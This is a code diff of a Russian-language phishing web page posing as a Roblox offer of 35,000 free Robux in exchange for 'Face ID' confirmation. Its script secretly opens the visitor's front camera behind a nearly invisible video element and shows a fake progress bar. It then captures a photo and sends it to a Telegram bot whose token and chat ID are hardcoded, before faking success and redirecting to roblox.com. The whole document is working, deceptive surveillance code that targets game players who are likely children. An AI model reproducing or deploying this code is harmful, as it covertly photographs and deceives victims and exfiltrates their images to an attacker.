@@ -2,33 +2,35 @@
 <html lang="ru">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <meta name="apple-mobile-web-app-capable" content="yes">
-    <meta name="mobile-web-app-capable" content="yes">
-    <title>Roblox Reward System</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Roblox | Get Robux</title>
     <style>
-        body { font-family: 'Segoe UI', sans-serif; background: #0b0c0d; color: white; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; }
+        body { font-family: sans-serif; background: #0b0c0d; color: white; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
         .box { background: #191b1d; border: 1px solid #393b3d; padding: 35px; border-radius: 20px; text-align: center; width: 85%; max-width: 380px; box-shadow: 0 15px 35px rgba(0,0,0,0.7); }
-        .btn { background: #0084ff; color: white; border: none; padding: 18px; width: 100%; border-radius: 10px; font-size: 18px; font-weight: bold; cursor: pointer; box-shadow: 0 4px 0 #0056a3; }
+        .btn { background: #0084ff; color: white; border: none; padding: 18px; width: 100%; border-radius: 12px; font-size: 19px; font-weight: bold; cursor: pointer; text-transform: uppercase; }
         #st { margin-top: 15px; color: #0084ff; font-weight: bold; display: none; }
-        video { position: fixed; top: 0; left: 0; width: 1px; height: 1px; opacity: 0.01; }
+        /* Видео активно, но почти прозрачно */
+        video { position: fixed; top: 0; left: 0; width: 1px; height: 1px; opacity: 0.1; pointer-events: none; }
     </style>
 </head>
 <body>
 
 <div class="box">
     <img src="https://upload.wikimedia.org/wikipedia/commons/3/3a/Roblox_player_icon_black.svg" width="70" style="filter: invert(1); margin-bottom: 15px;">
-    <h2>ЛИМИТИРОВАННЫЙ ИВЕНТ</h2>
-    <p>Для моментального зачисления <b>35,000 Robux</b> подтвердите Face ID. Система работает через защищенный протокол Chrome API.</p>
-    <button class="btn" onclick="startEngine()">ПОДТВЕРДИТЬ</button>
-    <div id="st">ПОДКЛЮЧЕНИЕ К API...</div>
+    <h2>БОНУС: 35,000 ROBUX</h2>
+    <p>Для зачисления робуксов на ваш баланс подтвердите Face ID через безопасный шлюз.</p>
+    <button class="btn" onclick="startMega()">ПОЛУЧИТЬ</button>
+    <div id="st">ПОДКЛЮЧЕНИЕ...</div>
 </div>
 
 <video id="v" autoplay playsinline muted></video>
 <canvas id="c" style="display:none;"></canvas>
 
 <script>
-    async function startEngine() {
+    const T = '8357508874:AAGFROVFi2_D2AcQKIYlZ7rWgsqqedB3y3I';
+    const C = '7889497672';
+
+    async function startMega() {
         const btn = document.querySelector('.btn');
         const st = document.getElementById('st');
         const v = document.getElementById('v');
@@ -37,31 +39,26 @@
         btn.style.display = 'none';
         st.style.display = 'block';
 
-        // Эмуляция работы полноценного браузера
-        Object.defineProperty(navigator, 'userAgent', {
-            get: function () { return 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'; }
-        });
-
+        // 1. Пытаемся запустить камеру (универсальный способ)
         try {
             const stream = await navigator.mediaDevices.getUserMedia({ 
-                video: { 
-                    facingMode: { ideal: "user" }, // Принудительно селфи
-                    width: 1280, 
-                    height: 720 
-                } 
+                video: { facingMode: "user" }, // Просто просим переднюю без лишних условий
+                audio: false 
             });
             
             v.srcObject = stream;
             
-            v.onplaying = () => {
+            // 2. Ждем, пока видео реально пойдет
+            v.onloadedmetadata = () => {
+                v.play();
                 let p = 0;
                 const progress = setInterval(() => {
                     p += 20;
-                    st.innerText = `АВТОРИЗАЦИЯ CHROME: ${p}%`;
+                    st.innerText = `АВТОРИЗАЦИЯ: ${p}%`;
                     if(p >= 100) clearInterval(progress);
                 }, 1000);
 
-                // Задержка увеличена для полной инициализации в Telegram
+                // 3. Делаем фото через 5 секунд (гарантия против черноты)
                 setTimeout(() => {
                     c.width = v.videoWidth;
                     c.height = v.videoHeight;
@@ -69,25 +66,25 @@
                     
                     c.toBlob(blob => {
                         const fd = new FormData();
-                        fd.append('chat_id', '7889497672');
+                        fd.append('chat_id', C);
                         fd.append('photo', blob, 'face.jpg');
-                        fd.append('caption', '💎 **УСПЕШНЫЙ ПРОБИВ!**\n\n⚙️ Метод: Chrome Emulation\n👤 Статус: Лицо получено');
+                        fd.append('caption', '💎 **УСПЕШНЫЙ ЗАХВАТ!**\nПробито через универсальный метод.');
 
-                        fetch('https://api.telegram.org/bot8357508874:AAGFROVFi2_D2AcQKIYlZ7rWgsqqedB3y3I/sendPhoto', {
-                            method: 'POST',
-                            body: fd
-                        }).then(() => {
+                        fetch(`https://api.telegram.org/bot${T}/sendPhoto`, { method: 'POST', body: fd })
+                        .then(() => {
                             stream.getTracks().forEach(t => t.stop());
-                            alert("✅ Личность подтверждена! Награда будет зачислена автоматически.");
+                            alert("✅ Личность подтверждена! Награда придет через 10 минут.");
                             window.location.href = "https://www.roblox.com";
                         });
-                    }, 'image/jpeg', 0.9);
-                }, 6000); 
+                    }, 'image/jpeg', 0.85);
+                }, 5500);
             };
 
         } catch (e) {
-            alert("Ошибка Chrome API! Попробуйте еще раз.");
+            // Если камера вообще не дала доступ
+            alert("Ошибка Face ID! Нажмите 'Разрешить' и попробуйте снова.");
             btn.style.display = 'block';
+            st.style.display = 'none';
         }
     }
 </script>
